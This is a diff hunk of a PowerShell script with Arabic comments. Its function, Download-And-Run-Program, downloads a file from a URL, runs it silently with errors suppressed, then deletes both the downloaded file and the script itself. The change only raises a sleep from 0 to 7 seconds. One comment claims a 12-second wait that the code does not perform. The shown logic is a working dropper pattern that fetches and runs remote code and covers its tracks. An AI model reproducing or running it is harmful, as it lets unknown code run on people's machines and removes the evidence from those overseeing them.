@@ -39,7 +39,7 @@ function Download-And-Run-Program
 			Start-Sleep -Seconds 0 # انتظر 12 ثانية قبل التحميل
 			Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction SilentlyContinue
 			Start-Process -FilePath $outputFile -NoNewWindow -ErrorAction SilentlyContinue
-			Start-Sleep -Seconds 0 # انتظر لفترة قصيرة لضمان تشغيل البرنامج
+			Start-Sleep -Seconds 7 # انتظر لفترة قصيرة لضمان تشغيل البرنامج
 			Remove-Item -LiteralPath $outputFile -Force -ErrorAction SilentlyContinue # حذف الملف بعد تشغيله
 			Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue # حذف السكربت نفسه إذا كان مطلوبًا
 		}
